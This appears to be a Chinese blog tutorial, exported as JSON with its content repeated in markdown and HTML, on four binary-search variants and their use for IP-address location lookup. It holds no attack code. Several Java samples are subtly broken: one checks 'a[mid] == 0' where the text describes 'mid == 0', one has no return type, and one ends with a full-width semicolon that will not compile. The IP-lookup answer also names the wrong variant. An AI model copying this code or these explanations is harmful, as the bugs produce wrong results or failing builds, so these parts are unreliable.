value的情况，我们需要更新low=mid+1。这两点都好理解，那当a[mid]=value的时候该如何处理呢？\n\n如果我们查找的是任意一个值等于给定值的元素，当a[mid]等于要查找的值时，a[mid]就是我们要查找的元素。但是如果我们要查找的是第一个值等于给定值的元素，当a[mid]等于要查找的值时，我们就需要确认一下这个元素是不是第一个定于给定值的元素。\n\n我们重点看一下第12行代码。如果mid等于0，那这个元素已经是数组的第一个元素，那它肯定是我们要找的。如果mid不等于0，但a[mid]的前一个元素a[mid-1]不等于value，那也说明a[mid]就是我们要找的第一个值等于给定值的元素。\n\n如果经过检查之后发现a[mid]前面的一个元素a[mid-1]也等于value，那说明此时的a[mid]肯定不是我们要找的第一个值等于给定值的元素。那我们就更新high=mid-1，因为我们要查找的元素肯定出现在[low. mid-1]之间。\n\n对比上面的两段代码，是不是下面那种更好理解？实际上，很多人觉得变形的二分查找很难，主要原因是追求第一种那样完美、简洁的写法。而对于我们做工程开发的人来说，代码易读懂、没Bug，其实更重要。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体2：查找最后一个值等于给定值的元素\n{% endnote %}\n</div>\n\n前面的问题是查找第一个值等于给定值的元素，我现在把问题稍微修改一下，查找最后一个只等于给定值的元素，又该如何做呢？\n\n如果你掌握了前面的写法，那这个问题你应该轻松就能解决，你可以先试着写一下，然后跟我写的对比一下。\n\n```java\npublic int binarySearch02(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\twhile (low <= high) {\n\t\tint mid = low + ((high-low)>>1);\n\t\tif(a[mid]<value) {\n\t\t\tlow = mid + 1;\n\t\t}else if (a[mid] > value){\n\t\t\thigh = mid - 1;\n\t\t}else {\n\t\t\tif (mid == n-1 || a[mid + 1] != value ){\n\t\t\t\treturn mid;\n\t\t\t}else {\n\t\t\t\tlow = mid + 1;\n\t\t\t}\n\t\t}\n\t}\n\treturn -1;\n}\n```\n\n我们还是重点看一下11行代码。如果a[mid]已经是这个数组中最后一个元素了，那它肯定是我么要找的；如果a[mid+1]不等于value，那也说明a[mid]就是我们要找的最后一个值等于给定值的元素。\n\n如果我们经过检查之后，发现a[mid]后面的一个元素a[mid+1]也等于value，那说明当前的元素并不是最后一个只等于给定值的元素，我们更新low=mid+1，因为要找的元素肯定在[mid+1, high]之间。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体3：查找第一个大于等于给定值的元素\n{% endnote %}\n</div>\n\n现在我们来看另一类变形问题。在有序数组中，查找第一个大于等于给定值的元素。比如数组中存储的这样一个序列：3,4,6,7,10.如果查找第一个大于等于5的元素，那就是6。\n\n实际上，实现的思路跟上面两种变形问题的实现思路类似，代码写起来甚至更简洁。\n\n```java\npublic int binarySearch03(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n -1;\n\twhile(low<=high){\n\t\tint mid = low + ((high - low) >> 1); \n\t\tif(a[mid] >= value) {\n\t\t\tif (mid == 0 || a[mid-1] < value) {\n\t\t\t \treturn mid;\n\t\t\t }else {\n\t\t\t \thigh = mid - 1;\n\t\t\t }\n\t\t}else {\n\t\t\tlow = mid + 1;\n\t\t}\n\t}\n\treturn -1;\n}\n```\n\n如果a[mid] 小于要查找的值value，那要查找的值肯定在[mid+1, high]之间，所以我们更新low = mid + 1。\n\n对于a[mid] 大于等于给到你告知value的情况，我们要先看下这个a[mid]是不是我们要找的第一个值大于等于给定值的元素。如果a[mid]的前面已经没有元素，或者前面一个元素小于要查找的值value，那a[mid]就是我们要找的元素，这段逻辑对应的代码是第7行。\n\n如果a[mid-1]也大于等于要查找的值value，那说明我们要查找的元素在[low, mid-1]之间，所以我们将high更新为mid-1。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 变体3：查找最后一个值小于等于给定值的元素\n{% endnote %}\n</div>\n\n现在，我们来看最后一种二分查找的变形问题，查找最后一个值小于等于给定值的元素。比如，数组中存储了这样一组数据：3,5,6,8,9,10。最后一个小于等于7的元素是6.是不是有点类似上面那一种？实际上实现思路也是类似的。\n\n有了前面的基础，你完全可以自己写出来了，所以我就不详细分析了。你可以自己写一下然后对比一下。\n\n```java\npublic int binarySearch04(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\twhile(low <= high) {\n\t\tint mid = low + ((high - low) >> 1); \n\t\tif (a[mid] <= value) {\n\t\t\tif (mid == n-1 || a[mid + 1] > value) {\n\t\t\t\treturn mid;\n\t\t\t}else {\n\t\t\t\tlow = mid + 1;\n\t\t\t}\n\t\t}if (a[mid] > value) {\n\t\t\thigh = mid - 1;\n\t\t}\n\t}\n\treturn -1；\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，现在我们来看开篇的问题：如何快速定位出一个IP地址的归属地？\n\n现在这个问题应该很简单了。如果IP区间与归属地的对应关系不经常更新，我们可以预先处理这12万条数据，让其按照起始IP从小到大排序。如何来排序呢？我们知道IP地址可以转化为32位的整型数，所以我们可以将起始IP地址按照对应的整型值的大小关系，从小到大进行排序。\n\n然后这个问题就可以转化为我们刚讲的第四种变形问题\"在有序数组中，查找最后一个等于某个给定值的元素\"了。\n\n当我们要查找某个IP归属地时，我们可以先通过二分查找，找到最后一个起始IP小于等于这个IP的IP区间，如果在，我们就取出对应的归属地显示；如果不在，就返回未查找到。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n上一节说过，凡是用二分查找能解决的，绝大部分我们更倾向于用散列表和二叉查找树。即便是二分查找在内存使用上更节省，但是毕竟内存如此紧缺的情况并不多，那二分查找真的没什么用处了吗？\n\n实际上，上一节讲的求\"值等于给定值\"的二分查找缺失不怎么会被用到，二分查找更适合用在\"近似\"查找问题，在这类问题上，二分查找的优势更明显。比如今天讲的这几种变体问题，用其他数据结构，如散列表、二叉树，就比较难实现了。\n\n变体的二分查找算法写起来非常烧脑，很容易因为细节处理不好而产生bug，这些容易出错的细节有：**终止条件、区间上下界更新方法、返回值选择**。所以今天讲的内容你最好能自己实现一遍，对锻炼编码能力、逻辑思维、写出bug free代码，会很有帮助。\n\n\n### 课后思考\n\n我们今天讲的都是非常规的二分查找问题，今天的思考题也是一个非常规的二分查找问题。如果有序数组是一个循环有序数组，比如4,5,6,1,2,3。针对这种情况，如何实现一个求\"值等于给定值\"的二分查找算法呢？\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-二分查找-下","published":1,"updated":"2019-06-26T03:52:03.507Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2ml004lo25twik7m1h1","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>通过IP地址来查找IP归属地的功能，不知道那有没有用过？没用过也没关系，你现在就可以打开百度，在搜索框中随便输入一个IP地址，就会看到它的归属地。</p>\n<img src=\"/posts/2018-11-09-算法-二分查找-下/IP地址归属地查询.jpg\">\n<p>这个功能并不复杂，它是通过维护一个很大的IP地址库来实现的。地址库汇总包括IP地址范围和归属地对应的关系。</p>\n<p>当我们想要查询202.102.133.13这个IP地址的归属地时，我们就在地址库中搜索，发现这个IP地址落在[202.102.133.0, 202.102.133.255]这个地址范围内，那我们就可以将这个IP地址范围对应的归属地”山东东营市”显示给用户了。</p>\n<p><strong>现在我的问题是，在庞大的地址库中逐一对比IP地址所在的区间，是非常耗时的。假设我们有12万条这样的IP区间与归属地的对应关系，如何快速定位出一个IP地址的归属地呢？</strong></p>\n<p>是不是觉得比较难？不要紧，等学完今天的内容，你就会发现这个问题其实很简单。</p>\n<p>上一节我讲了二分查找的原理，并且介绍了最简单的一种二分查找的代码实现。今天我们来讲几种二分查找的变形问题。</p>\n<p>不知道你有没有听过这样一个说法：”十个二分九个错”。二分查找虽然原理极其简单，但是想要写出没有bug的二分查找并不容易。</p>\n<p>康纳德·克努特(Donald E.Knuth) 在《计算机程序设计艺术》的第3卷《排序与查找》中说到”尽管第一个二分查找算法于1946年出现，然后第一个完全正确的二分查找算法实现直到1962年才出现”。</p>\n<p>你可能会说，我们上一节学的二分查找的代码实现并不难写啊。那是因为上一节讲的只是二分查找的一种最简单的情况，在不存在重复元素的有序数组中，查找给定值的元素。最简单的二分查找写起来确实不难，但是，二分查找的变形问题就没有那么好写了。</p>\n<p>二分查找的变形问题很多，我只选择几个典型的来讲解，其它你可以借助我今天讲的思路来分析。</p>\n<p>四种常见的二分查找的变形问题：</p>\n<ul>\n<li>查找第一个值等于给定值的元素</li>\n<li>查找最后一个值等于给定值的元素</li>\n<li>查找第一个大于等于给定值的元素</li>\n<li>查找最后一个小于给定值的元素</li>\n</ul>\n<p>需要特别说明一点，为了简化讲解，今天的内容，我都以数据是从小到大排列为前提，如果你要处理的数据是从大到小排列的，解决思路也是一样的。同时，我希望你最好先自己动手试着写一下这4个变形问题，然后再看看我的讲述，这样你就会对我说的”二分查找比较难写”有更加深刻的体会了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体1：查找第一个值等于给定值的元素\"><a href=\"#变体1：查找第一个值等于给定值的元素\" class=\"headerlink\" title=\"变体1：查找第一个值等于给定值的元素\"></a>变体1：查找第一个值等于给定值的元素</h3></div><br></div>\n\n<p>上一节中的二分查找是最简单的一种，即有序数据集合中不存在重复的数据，我们在其中查找值等于某个给定值的数据。如果我们将这个问题稍微修改下，有序数据集合中存在重复的数据，我们希望找到第一个值等于给定值的数据，止痒之前的二分查找代码还能工作吗？</p>\n<p>比如下面这样一个有序数组，其中，a[5], a[6], a[7]的值都等于8，是重复的数据，我们希望找到第一个等于8的数据，也就是下标是5的元素。</p>\n<img src=\"/posts/2018-11-09-算法-二分查找-下/有序数组.jpg\">\n<p>如果我们用上一节课讲的二分查找的代码实现，首先拿8与区间的中间值a[4] 比较，8比6大，于是在下标5到9之间继续查找。下标5和9中间的位置是下标7，a[7]正好等于8，所以代码就返回了。</p>\n<p>尽管a[7]也等于8，但它并不是我们想找的第一个等于8的元素，因为第一个值等于8的元素是下标为5的元素。我们上一节讲的二分查找代码就无法处理这种情况了。所以针对这个变形问题，我们可以稍微改造上一节的代码。</p>\n<p>100个人写二分查找就会有100中写法。网上有很多关于变形二分查找的实现方法，有很多写的非常简洁，比如下面这个写法。但是，尽管简洁，理解起来却非常烧脑，也很容易写错。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">binarySearch01</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &gt; value)&#123;</span><br><span class=\"line\">\t\t\thigh = mid -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (low &lt; n &amp;&amp; a[low] == value) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> low;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看完之后，你是不是觉得很不好理解？如果你只是死记硬背这个写法，我敢保证，过不了几天，你就会全部忘光，再让你写，90%的可能会写错。所以，我换了一种实现方法，你看看是不是更容易理解。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch01</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[mid] &gt; value) &#123;</span><br><span class=\"line\">\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a[mid] &lt; value) &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;\t\t\t</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[mid] == <span class=\"number\">0</span> || a[mid-<span class=\"number\">1</span>] != value) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我来稍微解释一下这段代码。a[mid] 跟要查找的value的大小关系有三种情况：大于、小于、等于。 对于a[mid]&gt;value的情况，我们需要更新high=mid-1；对于a[mid]&lt; value的情况，我们需要更新low=mid+1。这两点都好理解，那当a[mid]=value的时候该如何处理呢？</p>\n<p>如果我们查找的是任意一个值等于给定值的元素，当a[mid]等于要查找的值时，a[mid]就是我们要查找的元素。但是如果我们要查找的是第一个值等于给定值的元素，当a[mid]等于要查找的值时，我们就需要确认一下这个元素是不是第一个定于给定值的元素。</p>\n<p>我们重点看一下第12行代码。如果mid等于0，那这个元素已经是数组的第一个元素，那它肯定是我们要找的。如果mid不等于0，但a[mid]的前一个元素a[mid-1]不等于value，那也说明a[mid]就是我们要找的第一个值等于给定值的元素。</p>\n<p>如果经过检查之后发现a[mid]前面的一个元素a[mid-1]也等于value，那说明此时的a[mid]肯定不是我们要找的第一个值等于给定值的元素。那我们就更新high=mid-1，因为我们要查找的元素肯定出现在[low. mid-1]之间。</p>\n<p>对比上面的两段代码，是不是下面那种更好理解？实际上，很多人觉得变形的二分查找很难，主要原因是追求第一种那样完美、简洁的写法。而对于我们做工程开发的人来说，代码易读懂、没Bug，其实更重要。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体2：查找最后一个值等于给定值的元素\"><a href=\"#变体2：查找最后一个值等于给定值的元素\" class=\"headerlink\" title=\"变体2：查找最后一个值等于给定值的元素\"></a>变体2：查找最后一个值等于给定值的元素</h3></div><br></div>\n\n<p>前面的问题是查找第一个值等于给定值的元素，我现在把问题稍微修改一下，查找最后一个只等于给定值的元素，又该如何做呢？</p>\n<p>如果你掌握了前面的写法，那这个问题你应该轻松就能解决，你可以先试着写一下，然后跟我写的对比一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch02</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid]&lt;value) &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a[mid] &gt; value)&#123;</span><br><span class=\"line\">\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mid == n-<span class=\"number\">1</span> || a[mid + <span class=\"number\">1</span>] != value )&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们还是重点看一下11行代码。如果a[mid]已经是这个数组中最后一个元素了，那它肯定是我么要找的；如果a[mid+1]不等于value，那也说明a[mid]就是我们要找的最后一个值等于给定值的元素。</p>\n<p>如果我们经过检查之后，发现a[mid]后面的一个元素a[mid+1]也等于value，那说明当前的元素并不是最后一个只等于给定值的元素，我们更新low=mid+1，因为要找的元素肯定在[mid+1, high]之间。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体3：查找第一个大于等于给定值的元素\"><a href=\"#变体3：查找第一个大于等于给定值的元素\" class=\"headerlink\" title=\"变体3：查找第一个大于等于给定值的元素\"></a>变体3：查找第一个大于等于给定值的元素</h3></div><br></div>\n\n<p>现在我们来看另一类变形问题。在有序数组中，查找第一个大于等于给定值的元素。比如数组中存储的这样一个序列：3,4,6,7,10.如果查找第一个大于等于5的元素，那就是6。</p>\n<p>实际上，实现的思路跟上面两种变形问题的实现思路类似，代码写起来甚至更简洁。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch03</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low&lt;=high)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high - low) &gt;&gt; <span class=\"number\">1</span>); </span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &gt;= value) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mid == <span class=\"number\">0</span> || a[mid-<span class=\"number\">1</span>] &lt; value) &#123;</span><br><span class=\"line\">\t\t\t \t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t \thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t &#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果a[mid] 小于要查找的值value，那要查找的值肯定在[mid+1, high]之间，所以我们更新low = mid + 1。</p>\n<p>对于a[mid] 大于等于给到你告知value的情况，我们要先看下这个a[mid]是不是我们要找的第一个值大于等于给定值的元素。如果a[mid]的前面已经没有元素，或者前面一个元素小于要查找的值value，那a[mid]就是我们要找的元素，这段逻辑对应的代码是第7行。</p>\n<p>如果a[mid-1]也大于等于要查找的值value，那说明我们要查找的元素在[low, mid-1]之间，所以我们将high更新为mid-1。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体3：查找最后一个值小于等于给定值的元素\"><a href=\"#变体3：查找最后一个值小于等于给定值的元素\" class=\"headerlink\" title=\"变体3：查找最后一个值小于等于给定值的元素\"></a>变体3：查找最后一个值小于等于给定值的元素</h3></div><br></div>\n\n<p>现在，我们来看最后一种二分查找的变形问题，查找最后一个值小于等于给定值的元素。比如，数组中存储了这样一组数据：3,5,6,8,9,10。最后一个小于等于7的元素是6.是不是有点类似上面那一种？实际上实现思路也是类似的。</p>\n<p>有了前面的基础，你完全可以自己写出来了，所以我就不详细分析了。你可以自己写一下然后对比一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch04</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high - low) &gt;&gt; <span class=\"number\">1</span>); </span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[mid] &lt;= value) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mid == n-<span class=\"number\">1</span> || a[mid + <span class=\"number\">1</span>] &gt; value) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">if</span> (a[mid] &gt; value) &#123;</span><br><span class=\"line\">\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>；</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，现在我们来看开篇的问题：如何快速定位出一个IP地址的归属地？</p>\n<p>现在这个问题应该很简单了。如果IP区间与归属地的对应关系不经常更新，我们可以预先处理这12万条数据，让其按照起始IP从小到大排序。如何来排序呢？我们知道IP地址可以转化为32位的整型数，所以我们可以将起始IP地址按照对应的整型值的大小关系，从小到大进行排序。</p>\n<p>然后这个问题就可以转化为我们刚讲的第四种变形问题”在有序数组中，查找最后一个等于某个给定值的元素”了。</p>\n<p>当我们要查找某个IP归属地时，我们可以先通过二分查找，找到最后一个起始IP小于等于这个IP的IP区间，如果在，我们就取出对应的归属地显示；如果不在，就返回未查找到。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>上一节说过，凡是用二分查找能解决的，绝大部分我们更倾向于用散列表和二叉查找树。即便是二分查找在内存使用上更节省，但是毕竟内存如此紧缺的情况并不多，那二分查找真的没什么用处了吗？</p>\n<p>实际上，上一节讲的求”值等于给定值”的二分查找缺失不怎么会被用到，二分查找更适合用在”近似”查找问题，在这类问题上，二分查找的优势更明显。比如今天讲的这几种变体问题，用其他数据结构，如散列表、二叉树，就比较难实现了。</p>\n<p>变体的二分查找算法写起来非常烧脑，很容易因为细节处理不好而产生bug，这些容易出错的细节有：<strong>终止条件、区间上下界更新方法、返回值选择</strong>。所以今天讲的内容你最好能自己实现一遍，对锻炼编码能力、逻辑思维、写出bug free代码，会很有帮助。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们今天讲的都是非常规的二分查找问题，今天的思考题也是一个非常规的二分查找问题。如果有序数组是一个循环有序数组，比如4,5,6,1,2,3。针对这种情况，如何实现一个求”值等于给定值”的二分查找算法呢？</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>通过IP地址来查找IP归属地的功能，不知道那有没有用过？没用过也没关系，你现在就可以打开百度，在搜索框中随便输入一个IP地址，就会看到它的归属地。</p>\n<img src=\"/posts/2018-11-09-算法-二分查找-下/IP地址归属地查询.jpg\">\n<p>这个功能并不复杂，它是通过维护一个很大的IP地址库来实现的。地址库汇总包括IP地址范围和归属地对应的关系。</p>\n<p>当我们想要查询202.102.133.13这个IP地址的归属地时，我们就在地址库中搜索，发现这个IP地址落在[202.102.133.0, 